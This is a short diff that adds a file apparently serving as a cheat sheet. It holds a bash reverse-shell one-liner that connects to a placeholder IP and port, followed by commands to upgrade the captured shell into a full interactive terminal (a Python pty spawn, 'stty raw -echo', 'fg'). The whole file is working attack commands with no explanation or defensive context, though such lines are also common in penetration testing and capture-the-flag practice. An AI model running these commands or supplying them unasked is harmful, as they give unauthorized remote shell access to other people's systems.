@@ -1,0 +1,7 @@
+bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+stty raw -echo
+
+fg
